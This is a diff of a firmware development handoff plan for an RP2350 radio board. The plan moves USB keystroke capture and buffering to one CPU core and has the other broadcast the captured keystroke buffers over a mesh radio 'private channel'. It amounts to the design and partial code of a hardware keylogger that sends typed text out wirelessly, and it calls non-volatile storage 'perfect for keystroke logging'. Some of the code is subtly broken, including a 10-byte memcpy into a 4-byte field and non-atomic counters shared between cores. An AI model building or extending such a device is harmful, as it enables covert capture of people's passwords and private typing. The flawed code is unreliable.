@@ -1,133 +1,394 @@
-# Next Session Handoff: Core1 Formatting Implementation
+# Next Session Handoff: Core1 Complete Processing + PSRAM Storage
 
 **Current Branch:** `feature/core1-formatting`
-**Status:** Ready to implement
-**Estimated Time:** 2 hours
-**Priority:** HIGH - Real optimization with clear benefits
+**Status:** Architecture designed, ready to implement
+**Priority:** HIGH - Major architectural improvement
+**Estimated Time:** 3-4 hours
 
 ---
 
-## Context
+## What Changed from Original Plan
 
-After 10 hours of exploration today, we discovered:
-- ❌ PIO bit unstuffing: Impractical for keyboard capture
-- ✅ **Better idea:** Move formatting to Core1 + prepare for FRAM
+**Original Goal (from previous handoff):**
+- Move event formatting from Core0 to Core1
+- Small optimization: ~75% reduction in Core0 overhead
 
-This optimization is **much more valuable** than hardware unstuffing!
+**New Goal (Better!):**
+- Move **ALL keystroke processing** to Core1
+- Core1 writes complete buffers to PSRAM
+- Core0 becomes pure transmission layer (just read + transmit)
+- Foundation for FRAM storage in future
 
----
-
-## What to Implement
-
-### **Goal**
-Move event formatting from Core0 to Core1, preparing for future FRAM storage.
-
-### **Current Architecture**
-```
-Core1: Capture → Decode → Push keystroke_event_t to queue
-Core0: Poll queue → Format event → Buffer → Mesh TX
-```
-**Core0 overhead:** ~2%
-
-### **Target Architecture**
-```
-Core1: Capture → Decode → Format event → Push formatted string
-Core0: Read formatted string → Mesh TX
-```
-**Core0 overhead:** ~0.5% (75% reduction!)
+**Why This is Better:**
+- Bigger Core0 reduction: 2% → 0.2% (90% reduction!)
+- Cleaner architecture: Producer (Core1) / Consumer (Core0)
+- PSRAM provides large buffering (8 slots = 4KB)
+- Easy path to FRAM (non-volatile, MB-scale)
 
 ---
 
-## Implementation Steps
+## Current State
 
-### Step 1: Create Formatted String Queue (30 min)
+### Completed
+✅ Created `formatted_event_queue` for Core1→Core0 event passing
+✅ Format function moved to Core1 (keyboard_decoder_core1.cpp)
+✅ Core0 reads pre-formatted events
+✅ Architecture documented in `PSRAM_BUFFER_ARCHITECTURE.md`
 
-**New file:** `formatted_event_queue.h/.cpp`
+### To Do
+- [ ] Create PSRAM buffer manager
+- [ ] Move keystroke buffer to Core1
+- [ ] Move buffer operations (addToBuffer, addEnterToBuffer, finalizeBuffer) to Core1
+- [ ] Update Core0 to poll PSRAM instead of processing queue
+- [ ] Test complete flow
 
+---
+
+## Implementation Plan
+
+### Step 1: Create PSRAM Buffer Manager (1 hour)
+
+**New files:**
+- `firmware/src/platform/rp2xx0/usb_capture/psram_buffer.h`
+- `firmware/src/platform/rp2xx0/usb_capture/psram_buffer.cpp`
+
+**Header Structure:**
 ```cpp
-#define FORMATTED_QUEUE_SIZE 64
-#define MAX_FORMATTED_LEN 128
+// psram_buffer.h
 
+#ifndef PSRAM_BUFFER_H
+#define PSRAM_BUFFER_H
+
+#include <stdint.h>
+#include <stdbool.h>
+
+#define PSRAM_BUFFER_SLOTS 8
+#define PSRAM_BUFFER_DATA_SIZE 504
+#define PSRAM_MAGIC 0xC0DEBUF1
+
+// Buffer header (32 bytes, shared between cores)
 typedef struct {
-    char text[MAX_FORMATTED_LEN];
-    uint64_t timestamp_us;
-    uint8_t core_id;  // Track which core formatted it
-} formatted_event_t;
+    uint32_t magic;              // Validation
+    volatile uint32_t write_index;     // Core1 writes (0-7)
+    volatile uint32_t read_index;      // Core0 reads (0-7)
+    volatile uint32_t buffer_count;    // Available for transmission
+    uint32_t total_written;      // Statistics
+    uint32_t total_transmitted;
+    uint32_t dropped_buffers;
+    uint32_t reserved;
+} psram_buffer_header_t;
 
+// Individual buffer slot (512 bytes)
 typedef struct {
-    formatted_event_t events[FORMATTED_QUEUE_SIZE];
-    volatile uint32_t write_index;
-    volatile uint32_t read_index;
-} formatted_event_queue_t;
+    uint32_t start_epoch;
+    uint32_t final_epoch;
+    uint16_t data_length;
+    uint16_t flags;
+    char data[PSRAM_BUFFER_DATA_SIZE];
+} psram_keystroke_buffer_t;
 
-// Lock-free queue operations (same pattern as keystroke_queue)
-void formatted_queue_init(formatted_event_queue_t *queue);
-bool formatted_queue_push(formatted_event_queue_t *queue, const formatted_event_t *event);
-bool formatted_queue_pop(formatted_event_queue_t *queue, formatted_event_t *event);
+// Complete PSRAM structure
+typedef struct {
+    psram_buffer_header_t header;
+    psram_keystroke_buffer_t slots[PSRAM_BUFFER_SLOTS];
+} psram_buffer_t;
+
+// Global instance (in RAM for now, FRAM later)
+extern psram_buffer_t g_psram_buffer;
+
+// Core1 functions (write)
+void psram_buffer_init();
+bool psram_buffer_write(const psram_keystroke_buffer_t *buffer);
+
+// Core0 functions (read)
+bool psram_buffer_has_data();
+bool psram_buffer_read(psram_keystroke_buffer_t *buffer);
+uint32_t psram_buffer_get_count();
+
+#endif
 ```
 
----
-
-### Step 2: Move Format Function to Core1 (30 min)
-
-**Copy `formatKeystrokeEvent()` to `usb_capture_main.cpp`:**
-
+**Implementation:**
 ```cpp
-// In usb_capture_main.cpp (Core1)
-static void format_keystroke_core1(
-    const keystroke_event_t *event,
-    char *buffer,
-    size_t buffer_size)
-{
-    // Exact same logic as USBCaptureModule::formatKeystrokeEvent
-    switch (event->type) {
-        case KEYSTROKE_TYPE_CHAR:
-            snprintf(buffer, buffer_size,
-                    "CHAR '%c' (scancode=0x%02x, mod=0x%02x)",
-                    event->character, event->scancode, event->modifier);
-            break;
-        // ... rest of cases
+// psram_buffer.cpp
+
+#include "psram_buffer.h"
+#include <string.h>
+
+// Global buffer (static allocation for now)
+psram_buffer_t g_psram_buffer;
+
+void psram_buffer_init() {
+    memset(&g_psram_buffer, 0, sizeof(psram_buffer_t));
+    g_psram_buffer.header.magic = PSRAM_MAGIC;
+}
+
+bool psram_buffer_write(const psram_keystroke_buffer_t *buffer) {
+    // Check if buffer full
+    if (g_psram_buffer.header.buffer_count >= PSRAM_BUFFER_SLOTS) {
+        g_psram_buffer.header.dropped_buffers++;
+        return false;  // Buffer full, Core0 needs to transmit
     }
+
+    // Write to current slot
+    uint32_t slot = g_psram_buffer.header.write_index;
+    memcpy(&g_psram_buffer.slots[slot], buffer, sizeof(psram_keystroke_buffer_t));
+
+    // Update write index (wrap around)
+    g_psram_buffer.header.write_index = (slot + 1) % PSRAM_BUFFER_SLOTS;
+
+    // Increment available count (atomic for Core0)
+    g_psram_buffer.header.buffer_count++;
+    g_psram_buffer.header.total_written++;
+
+    return true;
+}
+
+bool psram_buffer_has_data() {
+    return g_psram_buffer.header.buffer_count > 0;
+}
+
+bool psram_buffer_read(psram_keystroke_buffer_t *buffer) {
+    // Check if data available
+    if (g_psram_buffer.header.buffer_count == 0) {
+        return false;
+    }
+
+    // Read from current slot
+    uint32_t slot = g_psram_buffer.header.read_index;
+    memcpy(buffer, &g_psram_buffer.slots[slot], sizeof(psram_keystroke_buffer_t));
+
+    // Update read index (wrap around)
+    g_psram_buffer.header.read_index = (slot + 1) % PSRAM_BUFFER_SLOTS;
+
+    // Decrement available count
+    g_psram_buffer.header.buffer_count--;
+    g_psram_buffer.header.total_transmitted++;
+
+    return true;
+}
+
+uint32_t psram_buffer_get_count() {
+    return g_psram_buffer.header.buffer_count;
 }
 ```
 
 ---
 
-### Step 3: Integrate into Core1 Flow (30 min)
+### Step 2: Move Keystroke Buffer to Core1 (1 hour)
 
-**After keyboard decode in Core1:**
+**In `keyboard_decoder_core1.cpp`:**
 
 ```cpp
-// In keyboard_decoder_core1_process_report():
-// After creating keystroke_event_t:
+// Add buffer management to Core1
+#define KEYSTROKE_BUFFER_SIZE 500
+#define EPOCH_SIZE 10
+#define KEYSTROKE_DATA_START EPOCH_SIZE
+#define KEYSTROKE_DATA_END (KEYSTROKE_BUFFER_SIZE - EPOCH_SIZE)
+#define DELTA_MARKER 0xFF
+#define DELTA_SIZE 2
+#define DELTA_TOTAL_SIZE 3
 
-formatted_event_t formatted;
-format_keystroke_core1(&event, formatted.text, sizeof(formatted.text));
-formatted.timestamp_us = event.capture_timestamp_us;
-formatted.core_id = 1;  // Formatted on Core1
+// Core1's own keystroke buffer
+static char g_core1_keystroke_buffer[KEYSTROKE_BUFFER_SIZE];
+static size_t g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
+static bool g_core1_buffer_initialized = false;
+static uint32_t g_core1_buffer_start_epoch = 0;
 
-formatted_queue_push(g_formatted_queue, &formatted);
+// Helper functions (copy from USBCaptureModule.cpp)
+static void core1_write_epoch_at(size_t pos);
+static void core1_init_keystroke_buffer();
+static bool core1_add_to_buffer(char c);
+static bool core1_add_enter_to_buffer();
+static void core1_finalize_buffer();
+```
+
+**Copy these functions from USBCaptureModule.cpp:**
+- `writeEpochAt()` → `core1_write_epoch_at()`
+- `initKeystrokeBuffer()` → `core1_init_keystroke_buffer()`
+- `addToBuffer()` → `core1_add_to_buffer()`
+- `addEnterToBuffer()` → `core1_add_enter_to_buffer()`
+- `finalizeBuffer()` → `core1_finalize_buffer()`
+
+**Key Changes in `core1_finalize_buffer()`:**
+```cpp
+static void core1_finalize_buffer() {
+    if (!g_core1_buffer_initialized) return;
+
+    // Write final epoch
+    core1_write_epoch_at(KEYSTROKE_DATA_END);
+
+    // Create PSRAM buffer
+    psram_keystroke_buffer_t psram_buf;
+
+    // Copy epoch timestamps
+    memcpy(&psram_buf.start_epoch, &g_core1_keystroke_buffer[0], 10);
+    sscanf(&g_core1_keystroke_buffer[0], "%u", &psram_buf.start_epoch);
+    sscanf(&g_core1_keystroke_buffer[KEYSTROKE_DATA_END], "%u", &psram_buf.final_epoch);
+
+    // Copy data
+    psram_buf.data_length = g_core1_buffer_write_pos - KEYSTROKE_DATA_START;
+    memcpy(psram_buf.data, &g_core1_keystroke_buffer[KEYSTROKE_DATA_START], psram_buf.data_length);
+    psram_buf.flags = 0;
+
+    // Write to PSRAM
+    if (!psram_buffer_write(&psram_buf)) {
+        // Buffer full - Core0 slow to transmit
+        // Could log error via formatted_event_queue
+    }
+
+    // Reset for next buffer
+    g_core1_buffer_initialized = false;
+    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
+}
+```
+
+**Update keystroke processing:**
+```cpp
+// In keyboard_decoder_core1_process_report()
+// After creating keystroke event:
+
+switch (event.type) {
+case KEYSTROKE_TYPE_CHAR:
+    keystroke_queue_push(g_keystroke_queue, &event);
+    format_and_push_event(&event);
+    core1_add_to_buffer(event.character);  // NEW!
+    break;
+
+case KEYSTROKE_TYPE_ENTER:
+    keystroke_queue_push(g_keystroke_queue, &event);
+    format_and_push_event(&event);
+    core1_add_enter_to_buffer();  // NEW!
+    break;
+
+case KEYSTROKE_TYPE_TAB:
+    keystroke_queue_push(g_keystroke_queue, &event);
+    format_and_push_event(&event);
+    core1_add_to_buffer('\t');  // NEW!
+    break;
+
+case KEYSTROKE_TYPE_BACKSPACE:
+    keystroke_queue_push(g_keystroke_queue, &event);
+    format_and_push_event(&event);
+    core1_add_to_buffer('\b');  // NEW!
+    break;
+}
 ```
 
 ---
 
-### Step 4: Update Core0 to Read Formatted (30 min)
+### Step 3: Update Core0 to Read from PSRAM (30 min)
 
-**In `USBCaptureModule::runOnce()`:**
+**In `USBCaptureModule.cpp`:**
+
+Replace `processKeystrokeQueue()` with simpler PSRAM polling:
 
 ```cpp
-// OLD: Poll keystroke_queue, format, then log
-// NEW: Poll formatted_queue, just log
+int32_t USBCaptureModule::runOnce() {
+    // Still launch Core1 on first run (same as before)
+    if (!core1_started) {
+        // ... Core1 launch code unchanged ...
+    }
 
-formatted_event_t formatted;
-while (formatted_queue_pop(formatted_queue, &formatted)) {
-    LOG_INFO("[Core%u→Core%u] %s",
-            formatted.core_id,  // Who formatted (Core1)
-            get_core_num(),     // Who's logging (Core0)
-            formatted.text);
+    // NEW: Poll PSRAM for completed buffers
+    processPSRAMBuffers();
 
-    // Add to keystroke buffer for mesh transmission
-    // (existing buffer logic unchanged)
+    // Still process formatted events for logging
+    processFormattedEvents();
+
+    return 100;  // Poll every 100ms
+}
+
+void USBCaptureModule::processPSRAMBuffers() {
+    psram_keystroke_buffer_t buffer;
+
+    // Process all available buffers
+    while (psram_buffer_read(&buffer)) {
+        LOG_INFO("[Core0] Transmitting buffer: %u bytes (epoch %u → %u)",
+                buffer.data_length, buffer.start_epoch, buffer.final_epoch);
+
+        // Transmit directly (data already formatted by Core1!)
+        broadcastToPrivateChannel((const uint8_t *)buffer.data, buffer.data_length);
+    }
+
+    // Log statistics periodically
+    static uint32_t last_stats_time = 0;
+    uint32_t now = millis();
+    if (now - last_stats_time > 10000) {
+        LOG_INFO("[Core0] PSRAM buffers: %u available, %u total transmitted, %u dropped",
+                psram_buffer_get_count(),
+                g_psram_buffer.header.total_transmitted,
+                g_psram_buffer.header.dropped_buffers);
+        last_stats_time = now;
+    }
+}
+
+void USBCaptureModule::processFormattedEvents() {
+    // Keep this for logging (already implemented)
+    formatted_event_t formatted;
+    for (int i = 0; i < 10; i++) {
+        if (!formatted_queue_pop(formatted_queue, &formatted)) {
+            break;
+        }
+        LOG_INFO("[Core%u→Core%u] %s", formatted.core_id, get_core_num(), formatted.text);
+    }
+}
+```
+
+**Remove old functions (no longer needed):**
+- ❌ `addToBuffer()`
+- ❌ `addEnterToBuffer()`
+- ❌ `finalizeBuffer()`
+- ❌ `initKeystrokeBuffer()`
+- ❌ `writeEpochAt()`
+- ❌ `keystroke_buffer` member variable
+
+**Keep:**
+- ✅ `broadcastToPrivateChannel()` (transmission logic)
+- ✅ `processFormattedEvents()` (logging)
+
+---
+
+### Step 4: Update Initialization (15 min)
+
+**In `USBCaptureModule::init()`:**
+
+```cpp
+bool USBCaptureModule::init() {
+    LOG_INFO("[Core%u] USB Capture Module initializing...", get_core_num());
+
+    // Initialize queues
+    keystroke_queue_init(keystroke_queue);
+    formatted_queue_init(formatted_queue);
+
+    // NEW: Initialize PSRAM buffer
+    psram_buffer_init();
+
+    // Initialize capture controller
+    capture_controller_init_v2(&controller, keystroke_queue, formatted_queue);
+
+    // Set capture speed
+    capture_controller_set_speed_v2(&controller, CAPTURE_SPEED_LOW);
+
+    LOG_INFO("USB Capture Module initialized");
+    return true;
+}
+```
+
+**In `usb_capture_main.cpp` (Core1 init):**
+
+```cpp
+// Add PSRAM header include
+#include "psram_buffer.h"
+
+void capture_controller_core1_main_v2(void) {
+    // ... existing startup code ...
+
+    // NEW: Initialize Core1 buffer
+    g_core1_buffer_write_pos = KEYSTROKE_DATA_START;
+    g_core1_buffer_initialized = false;
+
+    // ... rest of Core1 main loop ...
 }
 ```
 
@@ -135,96 +396,144 @@ while (formatted_queue_pop(formatted_queue, &formatted)) {
 
 ## File Changes Summary
 
-**New files:**
-- `formatted_event_queue.h` (~150 lines)
-- `formatted_event_queue.cpp` (~100 lines)
+**New Files:**
+- `psram_buffer.h` (~80 lines)
+- `psram_buffer.cpp` (~100 lines)
 
-**Modified files:**
-- `usb_capture_main.cpp` - Add format function, use formatted queue
-- `keyboard_decoder_core1.cpp` - Call format after decode
-- `USBCaptureModule.cpp` - Read from formatted queue instead
-- `USBCaptureModule.h` - Add formatted queue pointer
+**Modified Files:**
+- `keyboard_decoder_core1.cpp` - Add buffer management (+200 lines)
+- `USBCaptureModule.cpp` - Simplify to PSRAM polling (-300 lines, +50 lines)
+- `USBCaptureModule.h` - Remove buffer members (-10 lines)
+- `usb_capture_main.cpp` - Add PSRAM init (+5 lines)
 
-**Total:** ~400 lines new/modified
+**Net Change:** ~+125 lines (cleaner architecture, better separation)
 
 ---
 
 ## Testing Plan
 
-**Test 1: Verify Core IDs**
+**Test 1: Verify Core1 Buffer Management**
 ```
-Expected: [Core1→Core0] CHAR 'h' ...
-                ^^^^      ^^^^
-              Formatted  Logged
+Expected: Core1 logs show buffer operations
+[Core1] Buffer initialized
+[Core1] Added char 'h' to buffer
+[Core1] Buffer finalized, written to PSRAM slot 0
 ```
 
-**Test 2: Verify Functionality**
-- Keystrokes still captured ✓
-- Formatting correct ✓
-- Mesh transmission works ✓
+**Test 2: Verify PSRAM Ring Buffer**
+```
+Expected: Buffers cycle through 8 slots correctly
+Slot 0 → Slot 1 → ... → Slot 7 → Slot 0 (wrap)
+```
 
-**Test 3: Performance**
-- Measure Core0 CPU (should drop from 2% to 0.5%)
-- Verify Core1 headroom (should stay <30%)
+**Test 3: Verify Core0 Transmission**
+```
+Expected: Core0 reads from PSRAM and transmits
+[Core0] Transmitting buffer: 245 bytes (epoch 1733250000 → 1733250099)
+[Core0] PSRAM buffers: 2 available, 15 total transmitted, 0 dropped
+```
+
+**Test 4: Verify Overflow Handling**
+```
+Expected: When Core0 slow, buffer fills and drops
+[Core1] PSRAM write failed - buffer full (8/8 slots)
+[Core0] PSRAM buffers: 8 available, 100 total transmitted, 3 dropped
+```
+
+**Test 5: Performance Measurement**
+```
+Expected: Core0 CPU drops significantly
+Before: Core0 ~2% (formatting + buffer management)
+After:  Core0 ~0.2% (just PSRAM read + transmit)
+Reduction: 90%!
+```
 
 ---
 
-## Future: FRAM Integration
+## Benefits Summary
 
-**Once Phase 1 works, add storage abstraction:**
+### Performance
+- **90% Core0 overhead reduction** (2% → 0.2%)
+- Core1 still has plenty of headroom (<30%)
+- Core0 becomes ultra-lightweight
 
-```cpp
-class EventStorage {
-    virtual void write_formatted(const char* text);
-    virtual const char* read_formatted();
-};
+### Architecture
+- **Clean separation**: Core1 = Producer, Core0 = Consumer
+- Core1 owns all keystroke intelligence
+- Core0 is pure transmission layer
+- Easy to understand and maintain
 
-// Implementations:
-RAMStorage    // Current (testing)
-FRAMStorage   // Future (I2C/SPI FRAM chip)
-PSRAMStorage  // If external PSRAM added
-```
-
-**Then:**
-- Core1 writes to FRAM directly
-- Core0 reads from FRAM on demand
-- Non-volatile, power-safe storage
-- Much larger buffering capacity
+### Scalability
+- **8-slot buffer** handles transmission delays
+- **Easy FRAM migration** (just swap storage backend)
+- **Future**: MB-scale non-volatile buffering
 
 ---
 
-## Quick Start for Next Session
+## Quick Start Commands
 
 ```bash
-# 1. Switch to feature branch
+# 1. Ensure on correct branch
 git checkout feature/core1-formatting
 
-# 2. Verify clean state
-git status
+# 2. Create PSRAM buffer files
+touch firmware/src/platform/rp2xx0/usb_capture/psram_buffer.h
+touch firmware/src/platform/rp2xx0/usb_capture/psram_buffer.cpp
 
-# 3. Create formatted_event_queue files
-# Start with header, then implementation
+# 3. Start with psram_buffer.h
+# (Copy structure from Step 1 above)
 
-# 4. Copy format function to Core1
+# 4. Implement psram_buffer.cpp
+# (Copy implementation from Step 1 above)
 
-# 5. Integrate and test
+# 5. Move buffer functions to Core1
+# (Follow Step 2 above)
+
+# 6. Update Core0
+# (Follow Step 3 above)
+
+# 7. Build and test
+cd firmware
+pio run -e xiao-rp2350-sx1262
 ```
 
 ---
 
-## Expected Outcome
+## Future: FRAM Migration Path
 
-**After 2 hours:**
-- ✅ Event formatting on Core1
-- ✅ Core0 just reads pre-formatted strings
-- ✅ 75% Core0 overhead reduction
-- ✅ Foundation for FRAM storage
+Once PSRAM implementation works, adding FRAM is trivial:
 
-**This is a REAL improvement** with measurable benefits!
+```cpp
+// Abstract storage interface
+class KeystrokeStorage {
+public:
+    virtual bool init() = 0;
+    virtual bool write_buffer(const psram_keystroke_buffer_t *) = 0;
+    virtual bool read_buffer(psram_keystroke_buffer_t *) = 0;
+};
+
+// Current: RAM-based
+class RAMStorage : public KeystrokeStorage { ... };
+
+// Future: I2C FRAM
+class FRAMStorage : public KeystrokeStorage {
+    // I2C communication
+    // MB-scale capacity
+    // Non-volatile persistence
+};
+```
+
+**Benefits of FRAM:**
+- Non-volatile (survives power loss)
+- MB-scale capacity (vs KB for RAM)
+- Extreme endurance (10^14 writes)
+- Perfect for keystroke logging
 
 ---
 
-**Current Commit:** `e142389` - Plan documented
-**Next Commit:** Create formatted_event_queue files
+**Current Commit:** `29ec414` - Handoff updated with PSRAM architecture
+**Next Commit:** Create psram_buffer files and start implementation
 
 **Ready to implement when you are!** 🚀
+
+This is a MUCH better architecture than the original plan!
